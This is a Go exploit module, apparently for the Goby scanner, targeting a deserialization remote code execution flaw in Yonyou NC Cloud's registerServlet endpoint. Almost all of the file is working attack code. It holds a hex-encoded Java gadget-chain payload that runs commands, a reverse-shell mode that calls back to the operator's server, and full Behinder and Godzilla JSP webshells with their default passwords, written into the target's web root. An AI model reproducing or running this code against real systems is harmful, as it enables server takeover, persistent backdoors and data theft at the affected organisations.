package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC registerServlet Deserialize Remote Code Execute Vulnerability",
    "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2023-11-15",
    "PostTime": "2024-01-12",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\" || body=\"/portal/ufida.ico\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\" || body=\"/portal/ufida.ico\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://security.yonyou.com/#/noticeInfo?id=435\">https://security.yonyou.com/#/noticeInfo?id=435</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 NC registerServlet 反序列化远程代码执行漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC Cloud 是一种商业级的企业资源规划云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，实现企业的数字化转型和业务流程优化。</p><p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://security.yonyou.com/#/noticeInfo?id=435\" target=\"_blank\">https://security.yonyou.com/#/noticeInfo?id=435</a></p>",
            "Impact": "<p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yonyou NC registerServlet Deserialize Remote Code Execute Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://security.yonyou.com/#/noticeInfo?id=435\" target=\"_blank\">https://security.yonyou.com/#/noticeInfo?id=435</a></p>",
            "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10903"
}`

	sendPayloadDAAAAAWFSIIIREADOBJECT := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewRequestConfig("PUT", "/portal/registerServlet")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("cmd", cmd)
		postConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payload, _ := hex.DecodeString("aced0005771600000003000664734e616d6500086c616e67636f6465737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000077372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e000378707672002a6f72672e6d6f7a696c6c612e6a6176617363726970742e446566696e696e67436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400166765744465636c61726564436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00180000000074000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e0018000000027400024134757200025b42acf317f8060854e0020000787000001abfcafebabe00000031018f0a001e00a70a004300a80a004300a90a001e00aa0800ab0a001c00ac0a00ad00ae0a00ad00af0700b00a004300b108009f0a002100b20800b30800b40700b50800b60800b70700b80a001c00b90800ba0800bb0700bc0b001600bd0b00be00bf0b00be00c00800c10800c20700c30a001c00c40700c50a00c600c70800c80700c90800ca0a008c00cb0a002100cc0800cd0900ce00cf0a00ce00d00800d10a008c00d20a001c00d30800d40700d50a001c00d60800d70700d80800d90800da0a001c00db0700dc0a004300dd0a00de00d20800df0a002100e00800e10a002100e20800e30a002100e40a008c00e50800e60a002100e70800e809008c00e90a00ce00ea09008c00eb0700ec0a004300ed0a004300ee0800a00800ef0800f00a008c00f10800f20a008c00f30700f40a004c00f50700f60a004e00f70a008c00f80a004e00f90a004e00fa0a004e00fb0a002f00fc0a004c00fd0a002100fe0800ff0a010001010a002101020801030801040801050701060a005d00a70a005d01070801080a005d00fc08010908010a08010b08010c0a010d010e0a010d010f0701100a011101120a006801130801140a006801150a006800bf0a006801160a011101170a0111011808011908011a0a010d011b07011c0a0074011d0a007401120a0111011e0a0074011e0a0074011f0a012001210a012001220a012301240a012300fa0500000000000000320a004301250a011101260a007400fb0a002f01270a00ce01280a008c012908012a08012b08012c08012d0800a308012e07012f01000269700100124c6a6176612f6c616e672f537472696e673b010004706f72740100134c6a6176612f6c616e672f496e74656765723b0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c6501000a457863657074696f6e730100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100095369676e6174757265010028284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733c2a3e3b01000570726f7879010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100057772697465010038284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000a636c656172506172616d0100046578656301000772657665727365010016284c6a6176612f6c616e672f537472696e673b49295601000372756e0100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b4201000a536f7572636546696c6501000741342e6a6176610c009100920c013001310c013201330c01340135010007746872656164730c013601370701380c0139013a0c013b013c0100135b4c6a6176612f6c616e672f5468726561643b0c013d013e0c013f0140010004687474700100067461726765740100126a6176612f6c616e672f52756e6e61626c6501000674686973243001000768616e646c657201001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0c01410135010006676c6f62616c01000a70726f636573736f727301000e6a6176612f7574696c2f4c6973740c014201430701440c014501460c0147014801000372657101000b676574526573706f6e736501000f6a6176612f6c616e672f436c6173730c0149014a0100106a6176612f6c616e672f4f626a65637407014b0c014c014d0100096765744865616465720100106a6176612f6c616e672f537472696e67010003636d640c009a009b0c014e014f0100097365745374617475730701500c015101520c015301540100246f72672e6170616368652e746f6d6361742e7574696c2e6275662e427974654368756e6b0c009600970c0155014801000873657442797465730100025b420c0156014a010007646f57726974650100136a6176612f6c616e672f457863657074696f6e0100136a6176612e6e696f2e42797465427566666572010004777261700c015700970100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0c0158015907015a0100000c015b015c010010636f6d6d616e64206e6f74206e756c6c0c015d013e01000523232323230c015e015f0c009e009b0100013a0c01600161010022636f6d6d616e64207265766572736520686f737420666f726d6174206572726f72210c008d008e0c016201630c008f00900100106a6176612f6c616e672f5468726561640c009101640c01650092010005242424242401001266696c6520666f726d6174206572726f72210c009c009d01000540404040400c009f009b01000c6a6176612f696f2f46696c650c009101660100186a6176612f696f2f46696c654f757470757453747265616d0c009101670c00a300a40c009c01680c016900920c016a00920c016b013e0c016c013e0c016d016e0100076f732e6e616d6507016f0c0170009b0c0171013e01000377696e01000470696e670100022d6e0100176a6176612f6c616e672f537472696e674275696c6465720c01720173010005202d6e20340100022f63010005202d74203401000273680100022d630701740c017501760c009f01770100116a6176612f7574696c2f5363616e6e65720701780c0179017a0c0091017b0100025c610c017c017d0c0147013e0c017e017a0c017f00920100072f62696e2f7368010007636d642e6578650c009f018001000f6a6176612f6e65742f536f636b65740c009100a10c018101820c018301460701840c018501860c018701860701880c009c01890c018a018b0c018c01860c018d013e0c018e01860c00a000a101001673756e2e6d6973632e4241534536344465636f64657201000c6465636f64654275666665720100106a6176612e7574696c2e42617365363401000a6765744465636f6465720100266f72672e6170616368652e636f6d6d6f6e732e636f6465632e62696e6172792e426173653634010002413401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657454687265616447726f757001001928294c6a6176612f6c616e672f54687265616447726f75703b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000d6765745375706572636c6173730100086974657261746f7201001628294c6a6176612f7574696c2f4974657261746f723b0100126a6176612f7574696c2f4974657261746f720100076861734e65787401000328295a0100046e65787401001428294c6a6176612f6c616e672f4f626a6563743b0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010008676574427974657301000428295b420100116a6176612f6c616e672f496e7465676572010004545950450100114c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b01000b6e6577496e7374616e63650100116765744465636c617265644d6574686f64010007666f724e616d65010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100156a6176612f6c616e672f436c6173734c6f61646572010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100047472696d01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a01000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0100087061727365496e74010015284c6a6176612f6c616e672f537472696e673b2949010017284c6a6176612f6c616e672f52756e6e61626c653b29560100057374617274010015284c6a6176612f6c616e672f537472696e673b2956010011284c6a6176612f696f2f46696c653b2956010005285b422956010005666c757368010005636c6f7365010008746f537472696e6701000f6765744162736f6c757465506174680100077265706c616365010044284c6a6176612f6c616e672f4368617253657175656e63653b4c6a6176612f6c616e672f4368617253657175656e63653b294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f53797374656d01000b67657450726f706572747901000b746f4c6f77657243617365010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b295601000c75736544656c696d69746572010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f7574696c2f5363616e6e65723b01000e6765744572726f7253747265616d01000764657374726f79010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000f6765744f757470757453747265616d01001828294c6a6176612f696f2f4f757470757453747265616d3b0100086973436c6f7365640100136a6176612f696f2f496e70757453747265616d010009617661696c61626c65010003282949010004726561640100146a6176612f696f2f4f757470757453747265616d01000428492956010005736c656570010004284a29560100096578697456616c756501000a6765744d657373616765010008696e7456616c75650021008c001e0001000f00020002008d008e00000002008f00900000000900010091009200020093000003b6000600130000028e2ab70001b80002b600034c2bb600041205b600064d2c04b600072c2bb60008c00009c000094e2d3a041904be360503360615061505a2025819041506323a071907c70006a702431907b6000a3a081908120bb6000c9a000d1908120db6000c9a0006a702251907b60004120eb600064d2c04b600072c1907b600083a091909c1000f9a0006a702021909b600041210b600064d2c04b600072c1909b600083a091909b600041211b600064da700163a0a1909b60004b60013b600131211b600064d2c04b600072c1909b600083a091909b60004b600131214b600064da700103a0a1909b600041214b600064d2c04b600072c1909b600083a091909b600041215b600064d2c04b600072c1909b60008c00016c000163a0a190ab9001701003a0b190bb90018010099015b190bb9001901003a0c190cb60004121ab600064d2c04b600072c190cb600083a0d190db60004121b03bd001cb6001d190d03bd001eb6001f3a0e190db60004122004bd001c5903122153b6001d190d04bd001e5903122253b6001fc000213a0f190fc70006a7ff912a190fb60023b600243a10190eb60004122504bd001c5903b2002653b6001d190e04bd001e59031100c8b8002753b6001f572a1228b600293a111911b6002a3a091911122b06bd001c5903122c535904b20026535905b2002653b6002d190906bd001e5903191053590403b800275359051910beb8002753b6001f57190eb60004122e04bd001c5903191153b6001d190e04bd001e5903190953b6001f57a7004f3a112a1230b600293a121912123104bd001c5903122c53b6002d191204bd001e5903191053b6001f3a09190eb60004122e04bd001c5903191253b6001d190e04bd001e5903190953b6001f57a7000ea700053a08840601a7fda7b1000700a000ab00ae001200ce00dc00df001201c402300233002f003f00440285002f004700620285002f006500850285002f0088027f0285002f00010094000000de00370000001500040016000b001700150018001a00190026001b003f001d0047001e004e001f006500200070002100750022007d002300880024009300250098002600a0002800ab002b00ae002900b0002a00c1002c00c6002d00ce002f00dc003200df003000e1003100ec003300f1003400f9003501040036010900370117003801330039013e003a0143003b014b003c0164003d018a003e018f003f01920041019d004201c4004401cc004501d30046020e00470230004c0233004802350049023d004a025d004b027f004d028200510285004f0287001b028d00530095000000040001002f000100960097000300930000003900020003000000112bb80032b04db80002b600342bb60035b000010000000400050033000100940000000e00030000005d0005005e0006005f0095000000040001003300980000000200990001009a009b00010093000000ff000400040000009b2bc6000c12362bb600379900061238b02bb600394c2b123ab6003b99003b2a2bb7003c123db6003e4d2cbe059f0006123fb02a2c0332b500402a2c0432b80041b80027b50042bb0043592ab700444e2db600451246b02b1247b6003b9900222a2bb7003c123db6003e4d2cbe059f00061248b02a2c03322c0432b60049b02b124ab6003b99000d2a2a2bb7003cb6004bb02a2a2bb7003cb6004bb000000001009400000052001400000069000d006a0010006c0015006d001e006f00290070002f0071003200730039007400460075004f00760053007700560078005f0079006a007a0070007b0073007d007e007e0087007f009100810001009c009d00010093000000760003000500000036bb004c592bb7004d4ebb004e592db7004f3a0419042cb80050b600511904b600521904b60053a7000b3a041904b60054b02db60055b00001000900260029002f000100940000002600090000008c0009008e0013008f001c0090002100910026009400290092002b0093003100950002009e009b000100930000002f00030002000000172b123a1236b60056124a1236b6005612471236b60056b00000000100940000000600010000009e0001009f009b00010093000001c300040009000001271257b80058b600594d2bb600394c014e2c125ab6000c9900402b125bb6000c9900202b125cb6000c9a0017bb005d59b7005e2bb6005f1260b6005fb600614c06bd00215903122253590412625359052b533a04a7003d2b125bb6000c9900202b125cb6000c9a0017bb005d59b7005e2bb6005f1263b6005fb600614c06bd00215903126453590412655359052b533a04b800661904b600674ebb0068592db60069b7006a126bb6006c3a051905b6006d99000b1905b6006ea7000512363a06bb0068592db6006fb7006a126bb6006c3a05bb005d59b7005e1906b6005f1905b6006d99000b1905b6006ea700051236b6005fb600613a0619063a072dc600072db600701907b03a051905b600543a062dc600072db600701906b03a082dc600072db600701908bf0004009000fb0106002f009000fb011a00000106010f011a0000011a011c011a0000000100940000006a001a000000a7000900a8000e00a9001000ab001900ac002b00ad003f00af005600b1006800b2007c00b4009000b7009900b800ab00b900bf00ba00d100bb00f700bc00fb00c000ff00c1010300bc010600bd010800be010f00c0011300c1011700be011a00c0012000c1000100a000a100010093000001590004000c000000c91257b80058b60059125ab6000c9a000912714ea7000612724eb800662db600733a04bb0074592b1cb700753a051904b600693a061904b6006f3a071905b600763a081904b600773a091905b600783a0a1905b600799a00601906b6007a9e0010190a1906b6007bb6007ca7ffee1907b6007a9e0010190a1907b6007bb6007ca7ffee1908b6007a9e001019091908b6007bb6007ca7ffee190ab6007d1909b6007d14007eb800801904b6008157a700083a0ba7ff9e1904b600701905b60082a700094e2db6008357b1000200a700ad00b0002f000000bf00c2002f000100940000006e001b000000cf001000d0001600d2001900d4002200d5002d00d6004200d7005000d8005800d9006000da006d00dc007500dd008200df008a00e0009700e2009c00e300a100e400a700e600ad00e700b000e800b200e900b500eb00ba00ec00bf00ef00c200ed00c300ee00c800f0000100a20092000100930000002c00030001000000102a2ab400402ab40042b60084b60085b10000000100940000000a0002000000f4000f00f5000900a300a4000100930000011c00060004000000ac014c1286b800324d2c128704bd001c5903122153b6001d2cb6002a04bd001e59032a53b6001fc0002cc0002c4ca700044d2bc700431288b80032128903bd001cb6001d0103bd001eb6001f4d2cb60004128a04bd001c5903122153b6001d2c04bd001e59032a53b6001fc0002cc0002c4ca700044d2bc70034128bb800324d2c128a04bd001c5903122153b6001d4e2d2cb6002a04bd001e59032a53b6001fc0002cc0002c4ca700044d2bb000030002002d0030002f003500710074002f007900a600a9002f00010094000000460011000000fd000200ff00080100002d0103003001010031010400350106004c01070071010a007401080075010c0079010e007f010f008f011000a6011300a9011100aa0115000100a50000000200a674000b646566696e65436c6173737571007e001a00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00287371007e00137571007e0018000000017571007e001a0000000071007e001c7571007e001a0000000171007e001e7371007e00137571007e0018000000017571007e00180000000071007e00227571007e001a0000000171007e00247371007e000f7371007e0000770c000000103f4000000000000078737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878")
		postConfig.Data = string(payload)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	checkFileExistIZXCOPIKWIIIREADOBJECT := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(8)
			resp, _ := sendPayloadDAAAAAWFSIIIREADOBJECT(hostInfo, "echo "+checkString)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkString)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			webshell := ss.Params["webshell"].(string)
			if attackType == "cmd" {
				cmd := ss.Params["cmd"].(string)
				markFlag, _ := hex.DecodeString("6A6176612E6C616E672E436C617373436173744578")
				if resp, err := sendPayloadDAAAAAWFSIIIREADOBJECT(expResult.HostInfo, cmd); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, string(markFlag)) && len(resp.Utf8Html[:strings.Index(resp.Utf8Html, string(markFlag))-9]) > 0 {
					expResult.Output = resp.Utf8Html[:strings.Index(resp.Utf8Html, string(markFlag))-9]
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				sendPayloadDAAAAAWFSIIIREADOBJECT(expResult.HostInfo, fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp))
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = ss.Params["content"].(string)
					filename = ss.Params["filename"].(string)
				}
				_, err := sendPayloadDAAAAAWFSIIIREADOBJECT(expResult.HostInfo, fmt.Sprintf("$$$$$./webapps/nc_web/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content))))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if resp, err := checkFileExistIZXCOPIKWIIIREADOBJECT(expResult.HostInfo, filename); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
